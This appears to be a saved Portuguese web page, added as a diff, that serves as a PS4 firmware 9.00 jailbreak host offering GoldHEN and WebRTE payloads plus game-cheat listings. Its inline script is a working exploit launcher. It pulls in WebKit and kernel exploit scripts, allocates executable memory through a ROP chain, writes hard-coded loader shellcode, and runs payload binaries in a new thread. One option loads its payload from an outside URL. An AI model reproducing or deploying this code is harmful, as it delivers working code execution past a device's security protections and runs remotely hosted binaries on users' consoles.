@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<!-- saved from url=(0040)http://ps4trainer.com/Trainer/index.html -->
+<html lang="pt" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="google-site-verification" content="hJv8sL5Ve9kd2cVpDI-VSJnhVyK3pCfrGBCdbNWtgN0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <title>Treinador PS4</title>
+  
+            <script src="./index_files/jquery.min.js.download"></script>
+     
+            <script src="./index_files/loadingoverlay.min.js.download"></script>
+         
+            <script data-ad-client="ca-pub-1858709607248112" async="" src="./index_files/f.txt"></script>
+            <link href="./index_files/all.css" rel="stylesheet">
+            <link rel="stylesheet" href="./index_files/materialize.min.css">
+            <link rel="stylesheet" href="./index_files/animate.min.css">
+            <script src="./index_files/materialize.min.js.download"></script>
+            <link href="./index_files/icon" rel="stylesheet">
+            <link rel="stylesheet" href="./index_files/main.css">
+            <link rel="stylesheet" href="./index_files/shubham.css">
+
+            <script src="./index_files/shubham.js.download"></script>
+        <style> 
+		@-webkit-keyframes loadingoverlay_animation__rotate_right
+		{ to { -webkit-transform : rotate(360deg); transform : rotate(360deg); } 
+		} @keyframes loadingoverlay_animation__rotate_right { to 
+		{ -webkit-transform : rotate(360deg); transform : rotate(360deg); } }
+		@-webkit-keyframes loadingoverlay_animation__rotate_left { to 
+		{ -webkit-transform : rotate(-360deg); transform : rotate(-360deg); } }
+		@keyframes loadingoverlay_animation__rotate_left { to 
+		{ -webkit-transform : rotate(-360deg); transform : rotate(-360deg); } } 
+		@-webkit-keyframes loadingoverlay_animation__fadein { 0% 
+		{ opacity   : 0; -webkit-transform : scale(0.1, 0.1);
+		transform : scale(0.1, 0.1); } 50% { opacity   : 1; } 100% 
+		{ opacity   : 0; -webkit-transform : scale(1, 1); transform : scale(1, 1); } } 
+		@keyframes loadingoverlay_animation__fadein { 0% { opacity   : 0;
+		-webkit-transform : scale(0.1, 0.1); transform : scale(0.1, 0.1); } 50% 
+		{ opacity   : 1; } 100% { opacity   : 0; -webkit-transform : scale(1, 1); 
+		transform : scale(1, 1); } } 
+		@-webkit-keyframes loadingoverlay_animation__pulse { 0% { 
+		-webkit-transform : scale(0, 0); transform : scale(0, 0); } 50% { 
+		-webkit-transform : scale(1, 1); transform : scale(1, 1); } 100% { 
+		-webkit-transform : scale(0, 0); transform : scale(0, 0); } } 
+		@keyframes loadingoverlay_animation__pulse { 0% {
+		-webkit-transform : scale(0, 0); transform : scale(0, 0); } 50% { 
+		-webkit-transform : scale(1, 1); transform : scale(1, 1); } 100% {
+		-webkit-transform : scale(0, 0); transform : scale(0, 0); } }
+		</style><link 
+		type="text/css" rel="stylesheet" charset="UTF-8"
+		href="./index_files/translateelement.css">
+		
+		<script>
+			window.applicationCache.ondownloading=function(){document.getElementById("progress").innerHTML="Instalação de Cache da página!!";};
+			window.applicationCache.onprogress=function(a){document.getElementById("progress").innerHTML=(Math.round(100*(a.loaded/a.total)))+"%";};
+			window.applicationCache.oncached=function(){document.getElementById("progress").innerHTML="Cache Instalado Com Sucesso!!";setTimeout(function(){document.getElementById("progress").innerHTML="Desligue a Internet e reabra a página !!"; }, 1500);};
+		</script>
+		
+		<script>
+function load_poc(){
+var xhr = new XMLHttpRequest();
+xhr.responseType = "arraybuffer";
+xhr.open("GET",PLfile,true);
+xhr.send();
+xhr.onreadystatechange=function(){
+if (xhr.readyState == 4){
+  PLS = xhr.response;
+  setTimeout(poc, 1500);
+  }
+};
+}
+
+function LoaderPL() {
+if (out_jb == "AllPL")  {
+var payload_buffer = chain.syscall(477, 0, 0x300000 , 7, 0x1002, -1, 0);
+            var pl = p.array_from_address(payload_buffer, PLS.byteLength*4);
+            var buf = new Uint32Array(PLS);
+            pl.set(buf,0);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            allset();
+}
+else if (out_jb == "MLD")  {
+var payload_buffer = chain.syscall(477, 0, 0x300000 , 7, 0x1002, -1, 0);
+            var pl = p.array_from_address(payload_buffer, PLS.byteLength*4);
+            var buf = new Uint32Array(PLS);
+            pl.set(buf,0);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            Mset();
+}
+else if (out_jb == "JB")  {
+allset();
+}
+
+else if (out_jb == "BinLD") {
+    var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_loader = p.malloc32(0x1000);
+    
+    var loader_writer = payload_loader.backing;
+    loader_writer[0] = 0x56415741;
+    loader_writer[1] = 0x83485541;
+    loader_writer[2] = 0x894818EC;
+    loader_writer[3] = 0xC748243C;
+    loader_writer[4] = 0x10082444;
+    loader_writer[5] = 0x483C2302;
+    loader_writer[6] = 0x102444C7;
+    loader_writer[7] = 0x00000000;
+    loader_writer[8] = 0x000002BF;
+    loader_writer[9] = 0x0001BE00;
+    loader_writer[10] = 0xD2310000;
+    loader_writer[11] = 0x00009CE8;
+    loader_writer[12] = 0xC7894100;
+    loader_writer[13] = 0x8D48C789;
+    loader_writer[14] = 0xBA082474;
+    loader_writer[15] = 0x00000010;
+    loader_writer[16] = 0x000095E8;
+    loader_writer[17] = 0xFF894400;
+    loader_writer[18] = 0x000001BE;
+    loader_writer[19] = 0x0095E800;
+    loader_writer[20] = 0x89440000;
+    loader_writer[21] = 0x31F631FF;
+    loader_writer[22] = 0x0062E8D2;
+    loader_writer[23] = 0x89410000;
+    loader_writer[24] = 0x2C8B4CC6;
+    loader_writer[25] = 0x45C64124;
+    loader_writer[26] = 0x05EBC300;
+    loader_writer[27] = 0x01499848;
+    loader_writer[28] = 0xF78944C5;
+    loader_writer[29] = 0xBAEE894C;
+    loader_writer[30] = 0x00001000;
+    loader_writer[31] = 0x000025E8;
+    loader_writer[32] = 0x7FC08500;
+    loader_writer[33] = 0xFF8944E7;
+    loader_writer[34] = 0x000026E8;
+    loader_writer[35] = 0xF7894400;
+    loader_writer[36] = 0x00001EE8;
+    loader_writer[37] = 0x2414FF00;
+    loader_writer[38] = 0x18C48348;
+    loader_writer[39] = 0x5E415D41;
+    loader_writer[40] = 0x31485F41;
+    loader_writer[41] = 0xC748C3C0;
+    loader_writer[42] = 0x000003C0;
+    loader_writer[43] = 0xCA894900;
+    loader_writer[44] = 0x48C3050F;
+    loader_writer[45] = 0x0006C0C7;
+    loader_writer[46] = 0x89490000;
+    loader_writer[47] = 0xC3050FCA;
+    loader_writer[48] = 0x1EC0C748;
+    loader_writer[49] = 0x49000000;
+    loader_writer[50] = 0x050FCA89;
+    loader_writer[51] = 0xC0C748C3;
+    loader_writer[52] = 0x00000061;
+    loader_writer[53] = 0x0FCA8949;
+    loader_writer[54] = 0xC748C305;
+    loader_writer[55] = 0x000068C0;
+    loader_writer[56] = 0xCA894900;
+    loader_writer[57] = 0x48C3050F;
+    loader_writer[58] = 0x006AC0C7;
+    loader_writer[59] = 0x89490000;
+    loader_writer[60] = 0xC3050FCA;
+    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var pthread = p.malloc(0x10);
+    //
+    {
+        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+    }
+    chain.run();
+    Binset();
+}
+
+}
+
+function allset() {
+window.progress.innerHTML= LoadedMSG
+}
+
+
+function loadScript(path)
+{
+    var xhr = new XMLHttpRequest(path);
+    xhr.open("GET", path, false);
+    xhr.send('');
+    return xhr.responseText;
+}
+
+function print(){}
+
+
+function goldhen20b(){
+    progress.innerHTML="Goldhen 2.0b carregando... por favor aguarde";
+    LoadedMSG="GoldHEN 2.0b Carregado";
+    PLfile = "goldhen2b.bin";
+    out_jb = "AllPL";
+    load_poc();
+}
+
+function goldhen20b2(){
+    progress.innerHTML="Goldhen 2.0b2 carregando... por favor aguarde";
+    LoadedMSG="GoldHEN 2.0b2 Carregado";
+    PLfile = "goldhen2b2.bin";
+    out_jb = "AllPL";
+    load_poc();
+}
+
+function goldhen21(){
+    progress.innerHTML="Goldhen 2.1 carregando... por favor aguarde";
+    LoadedMSG="GoldHEN 2.1 Carregado";
+    PLfile = "goldhen_2.1_900.bin";
+    out_jb = "AllPL";
+    load_poc();
+}
+
+function goldhen211(){
+    progress.innerHTML="Goldhen 2.1.1 carregando... por favor aguarde";
+    LoadedMSG="GoldHEN 2.1.1 Carregado";
+    PLfile = "goldhen_2.1.1_900.bin";
+    out_jb = "AllPL";
+    load_poc();
+}
+
+function goldhen212(){
+    progress.innerHTML="Goldhen 2.1.2 carregando... por favor aguarde";
+    LoadedMSG="GoldHEN 2.1.2 Carregado";
+    PLfile = "goldhen_212_900.bin";
+    out_jb = "AllPL";
+    load_poc();
+}
+
+function load_WebRTE(){
+    progress.innerHTML="Carga útil carregando... por favor aguarde"; LoadedMSG="Carga útil carregada";
+    PLfile = "WebRTE.bin";
+    out_jb = "AllPL";     load_poc();
+}
+
+function ps4trainer(){
+    progress.innerHTML="Carga útil carregando... por favor aguarde"; LoadedMSG="Carga útil carregada";
+    PLfile = "http://karo218.ir/PS4TRAINER/index.html";
+    out_jb = "AllPL";     load_poc();
+}
+
+
+
+
+function allmods(){
+all.style.display = "none";
+gtav.style.display = "block";
+		}
+function backall(){
+all.style.display = "block";
+gtav.style.display = "none";
+		}
+</script>
+<script src="int64.js"></script>
+<script src="rop.js"></script>
+<script src="kexploit.js"></script>
+<script src="webkit.js"></script>
+		
+		
+</head>
+
+	<body>
+   
+
+            <nav class="ps_nav" style="padding-right: 20%;
+            padding-left: 12%;">
+            <div class="nav-wrapper row">
+                <span class="brand-logo col s40"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GEOVANE FORMATAÇÕES DE PC & DESBLOQUEIO DE PS4</font></font></span>
+            </div>
+			
+			</nav>
+   	<h1 id=progress style='font-size:35px;text-align:center;color:white;'>Status</h1>    
+
+
+
+		
+		
+		
+		<div>
+            <div id="list_container" style="padding-right: 4%;padding-left: 4%;" class="row">
+			
+			
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0s;"
+	
+	
+	onMouseOver="progress.innerHTML='Goldhen 2.1.2 Sevir Para Desbloquear o PS4 na Versão 9.00'"; 
+	onmouseout="progress.innerHTML='Status'"
+	type="button"
+	onclick="goldhen212()"
+	
+	
+	>
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"   src="./index_files/01.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOLDHEN 2.1.2</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Goldhen 2.1.2 Sevir Para Desbloquear o PS4 na Versão 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v2.1.2</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.5s;"
+	
+	onMouseOver="progress.innerHTML='Goldhen 2.1.1 Sevir Para Desbloquear o PS4 na Versão 9.00'"; 
+	onmouseout="progress.innerHTML='Status'"
+	type="button"
+	onclick="goldhen211()"
+	
+	>
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/02.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOLDHEN 2.1.1</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Goldhen 2.1.1 Sevir Para Desbloquear o PS4 na Versão 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v2.1.1</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.1s;"
+	
+	onMouseOver="progress.innerHTML='Goldhen 2.1 Sevir Para Desbloquear o PS4 na Versão 9.00'"; 
+	onmouseout="progress.innerHTML='Status'"
+	type="button"
+	onclick="goldhen21()"
+	
+	>
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/03.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOLDHEN 2.1</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Goldhen 2.1 Sevir Para Desbloquear o PS4 na Versão 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v2.1</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.15s;"
+	
+	onMouseOver="progress.innerHTML='Goldhen 2.0.b2 Sevir Para Desbloquear o PS4 na Versão 9.00'"; 
+	onmouseout="progress.innerHTML='Status'"
+	type="button"
+	onclick="goldhen20b2()"
+	
+	>
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/04.jpg">
+    <div class="row game-info text-white">
+   <p class="game-name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOLDHEN 2.0.b2</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Goldhen 2.0.b2 Sevir Para Desbloquear o PS4 na Versão 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v2.0.b2</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.2s;"
+	
+	onMouseOver="progress.innerHTML='Goldhen 2.0.b Sevir Para Desbloquear o PS4 na Versão 9.00'"; 
+	onmouseout="progress.innerHTML='Status'"
+	type="button"
+	onclick="goldhen20b()"
+	
+	>
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/05.jpg">
+    <div class="row game-info text-white">
+   <p class="game-name"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOLDHEN 2.b2</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Goldhen 2.b2 Sevir Para Desbloquear o PS4 na Versão 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v2.b2</font></font></span></p>
+   </div>
+    </div>
+    </div></div>
+	
+		
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.25s;"
+	
+	onMouseOver="progress.innerHTML='WebRTE Servi para ativar o Cheats do PS4 9.00'"; 
+	onmouseout="progress.innerHTML='Status'" 
+	type="button" onclick="load_WebRTE()" 
+	
+	>
+
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy" src="./index_files/06.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" title="A Plague Tale: Inocência"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WebRTE</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WebRTE Sevir para ativar o Cheats do PS4 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v01.01</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.3s;"
+	
+
+	
+	>
+	<button><a href='http://karo218.ir/PS4TRAINER/index.html' style= "background-color:black;" >	
+	
+	
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy" src="./index_files/07.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS4 TRAINER</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SITE DE CHEATS E TRAPAÇAS PARA JOGOS DE PS4 9.00</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v01.00</font></font></span></p>
+    </div>
+    </div>
+    </div>
+
+	</div></a> </button>
+	
+	
+
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.35s;">
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/08.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" title="AOT 2"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AOT 2</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CUSA08948</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v01.10</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn" style="animation-delay: 0.4s;">
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/09.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" title="ACE COMBAT™ 7: CÉUS DESCONHECIDO"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACE COMBAT™ 7: CÉUS DESCONHECIDO</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CUSA07202</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v1.01</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+	
+	
+	<div class="col col s12 m6 x4 xl5ths trainer-card animate__animated animate__zoomIn"  style="animation-delay: 0.45s;">
+    <div class="trainer-card-content waves-effect waves-dark">
+    <div>
+    <img class="ps_thumb" loading="lazy"  src="./index_files/10.jpg">
+    <div class="row game-info text-white">
+    <p class="game-name" title="ACE COMBAT™ 7: CÉUS DESCONHECIDO"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACE COMBAT™ 7: CÉUS DESCONHECIDO</font></font></p>
+    <p class="cusa"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CUSA05636</font></font></p>
+    <p class="version"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v01.51</font></font></span></p>
+    </div>
+    </div>
+    </div></div>
+
+        <div id="trainer-dialog" class="modal fade" tabindex="0">
+            
+            
+
+            <div id="fav-dialog" class="modal fade" style="width: 90%;
+            height: 90%;background: #182039;" tabindex="0">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <div class="ps_modal_game_info" style="min-height: 140px">
+                            <div class="bg-black cover_parent">
+                              
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+  </div>
+   </div></div>
+   </body>
+   </html>
